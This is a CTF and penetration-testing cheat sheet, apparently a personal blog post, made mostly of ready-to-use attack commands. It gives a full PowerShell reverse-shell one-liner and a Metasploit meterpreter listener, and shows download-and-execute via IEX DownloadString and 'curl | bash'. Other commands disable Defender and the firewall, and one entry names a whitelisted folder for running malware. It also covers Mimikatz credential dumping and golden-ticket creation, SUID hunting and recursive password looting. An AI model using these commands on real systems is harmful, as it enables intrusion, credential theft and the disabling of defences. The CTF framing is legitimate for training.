---
title: Cheat Sheet
published: true
---

This is a Cheat sheet with misc stuff that i have collected doing different CTF's. This blogpost will be updated with more content... and maybe with an index to find stuff more easy.

## [](#header-2)Windows

### [](#header-3)Local priv esc

A good reference for Windows local priv esc.

<a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation" target="_blank">https://book.hacktricks.xyz/windows/windows-local-privilege-escalation</a>


### [](#header-3)Download files

Read and execute a file from a weblink with powershell.

```
Powershell IEX(New-Object Net.WebClient).DownloadString('http://IP:PORT/FILENAME')
```

Download and output a file from powershell.

```
Powershell Invoke-WebRequest -Uri IPNUMMER:PORT/FILNAMN -OutFile FILENAME
```



### [](#header-3)Listener in Metasploit

Quick oneliner for setting up a listener in Metasploit for reverse shell for Windows. In this example it's a meterpreter listener.

```
sudo msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.14.10; set lport 4444; set ExitOnSession false; exploit -j"
```



### [](#header-3)Powershell reverse shell

A powershell oneliner for a reverse shell.

```
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.20",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() 
```


### [](#header-3)Reference for domain

Domain enumeration.

<a href="https://medium.com/@Shorty420/enumerating-ad-98e0821c4c78" target="_blank">https://medium.com/@Shorty420/enumerating-ad-98e0821c4c78</a>

Active Directory.

<a href="https://blog.stealthbits.com/category/active-directory/" target="_blank">https://blog.stealthbits.com/category/active-directory/</a>


### [](#header-3)Recursive dir and searching in Windows

A recursive dir in powershell.

```
powershell Get-ChildItem -Recurse
```

Search for files in the whole system powershell.

```
powershell Get-ChildItem -Path C:\ -Include *.sqlite -File -Recurse -ErrorAction SilentlyContinue
```

Search for files in the whole system CMD.

```
dir FILEMAME /s /p
```


### [](#header-3)Windows set environment

Set env in Windows. Very useful if you wanna run an application from an unintended location.

```
$env:Path += ";C:\Users\username\Documents\Location\"
```


### [](#header-3)Disable antivirus and Firewall

Disable antivirus.

```
set-mppreference -disablerealtimemonitoring $true
```

Disable firewall.

```
netsh advfirewall set  currentprofile state off
```


### [](#header-3)LDAP

Nmap script for Ldap.

```
nmap -Pn -p 389 --script ldap-brute --script-args ldap.base='"cn=users,dc=cascade,dc=local"' 10.10.10.182
```

Python3 ldap_search for password spray.

<a href="https://github.com/m8r0wn/ldap_search" target="_blank">https://github.com/m8r0wn/ldap_search</a>


### [](#header-3)Powershell commands

Load a powershell shell with execution policy bypassed.

```
powershell -ep bypass
```

Show all groups.

```
powershell Get-NetGroup -GroupName *
```

Get information about admin accounts.

```
powershell Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'}
```

Show shares on the domain.

```
powershell Invoke-ShareFinder 
```

A command to show computers on the network.

```
Get-NetComputer -fulldata | select operatingsystem
```

### [](#header-3)Misc

Recover LAPS passwords.

<a href="https://secureidentity.se/recover-laps-passwords/" target="_blank">https://secureidentity.se/recover-laps-passwords/</a>

A good place to put and run malware from in Windows, usually whitelisted.

```
C:\\Windows\\System32\\spool\\drivers\\color\\ 
```



### [](#header-3)Mysql dump

Just dumping mysql database to a file.

```
mysqldump -u root -p databasename > C:\Location\database.sql
```


### [](#header-3)Bloodhound dump

Dumping with SharHound. Download SharpHound.ps1 script to the machine and run like this.

```
Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
```


### [](#header-3)Powershell Webserver

Warning! "Impossible" to stop.

```
function Load-Packages
{
    param ([string] $directory = 'Packages')
    $assemblies = Get-ChildItem $directory -Recurse -Filter '*.dll' | Select -Expand FullName
    foreach ($assembly in $assemblies) { [System.Reflection.Assembly]::LoadFrom($assembly) }
}

Load-Packages

$url = 'http://*:443/'
$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add($url)
$listener.Start()

Write-Host "Listening at $url..."

while ($listener.IsListening)
{
    $context = $listener.GetContext()
    $requestUrl = $context.Request.Url
    $response = $context.Response

    Write-Host ''
    Write-Host "> $requestUrl"

    $localPath = $requestUrl.LocalPath

    $buffer = [System.Text.Encoding]::UTF8.GetBytes('<html><body>Hello world!</body></html>')
    $response.ContentLength64 = $buffer.Length
    $response.OutputStream.Write($buffer, 0, $buffer.Length)

    $response.Close()

    $responseStatus = $response.StatusCode
    Write-Host "< $responseStatus"
}
```


## [](#header-2)Mimikatz

### [](#header-3)Dump hashes

Run mimikatz with priviliges.

```
privilege::debug
```

Dump hashes.

```
lsadump::lsa /patch
```

Crack with hashcat.

```
hashcat -m 1000 <hash> rockyou.txt -r OneRuleToRuleThemAll.rule
```


### [](#header-3)Krbtgt

Run mimikatz with priviliges.

```
privilege::debug
```

Dumping security identifier of the Kerberos Ticket Granting Ticket. This will allow creating a golden ticket.

```
lsadump::lsa /inject /name:krbtgt
```

Example:

```
mimikatz # lsadump::lsa /inject /name:krbtgt
Domain: CONTROLLER / S-1-5-21-###22342-###5553-245633

RID  : 00000034 (502)
User : krbtgt

	* Primary
	   NTLM : 393852432837248324234cas 
```

Create a golden ticket.

```
kerberos::golden /user: /domain: /sid: /krbtgt: /id:
```

Example:

```
mimikatz # kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-###22342-###5553-245633 /krbtgt:393852432837248324234cas /id:500
```

Use the ticket to access other machines with mimikatz

```
misc::cmd
```


## [](#header-2)Linux

### [](#header-3)Enumeration

Run LinEnum.sh, linpeas.sh and pspy to get some information about the system and running services.

```
git clone https://github.com/rebootuser/LinEnum.git
```

```
git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite.git
```

Post exploitation. Multiple tools, including pspy64, dirtyc0w etc.

```
git clone https://github.com/wildkindcc/Exploitation.git
```

g0tmi1k's guide to priv esc in Linux

<a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" target="_blank">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a>


### [](#header-3)Simple shells

```
/bin/sh -i
```

```
/usr/bin/script -qc /bin/bash /dev/null
```


### [](#header-3)Python interactive shells

First run /bin/bash in Kali, this method donät like zsh!

Python2

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

Python3

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Background the shell with Ctrl+z.

```
stty raw -echo
```

```
fg
```


Now the shell should pop up, if its not interactive with autocomplete run:

```
bash
```

You can also make this nicer with cols and rows if needed.


### [](#header-3)Python webserver

Python2

```
python -m SimpleHTTPserver
```


Python3

```
python3 -m http.server
```

### [](#header-3)Misc

Last edited files (10 minutes).

```
find / -mmin -10 2>/dev/null | grep -Ev "^/proc"
```

Compile exploits:

<a href="https://medium.com/@_____________/compiling-exploits-4ec7bb9ec03c" target="_blank">https://medium.com/@_____________/compiling-exploits-4ec7bb9ec03c</a>

Download a file with curl.

```
curl http://some.url --output some.file
```

Download a file and run it with curl.

```
curl http://some.url | bash
```

Start and stop SSH-server Kali.

Start

```
sudo systemctl start ssh.socket 
```

Stop

```
sudo systemctl stop ssh.socket
```


### [](#header-3)Find files with set user ID


```
find / -perm +4000 -user root -type f -print
```

```
find / -perm /4000 2>/dev/null
```

```
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 6 -exec ls -ld {} \; 2>/dev/null
```

```
find / -perm -1000 -type d 2>/dev/null
```

```
find / -perm -g=s -type f 2>/dev/null
```

```
find / -perm -u=s -type f 2>/dev/null
```

```
find / -user root -perm -4000 -exec ls -ldb {} \;
```


### [](#header-3)Looting for passwords

```
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
```

```
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
```

Find passwords in memory.

```
strings /dev/mem -n10 | grep -i pass
```

### [](#header-3)Cat all subfolders

```
find . -type f -exec cat {} +
```

The following tries to list all files with content of:

```
find . -type f -maxdepth 4 | xargs grep -i "password"
```

```
find / -type f -maxdepth 4 | xargs grep -i "password"
```









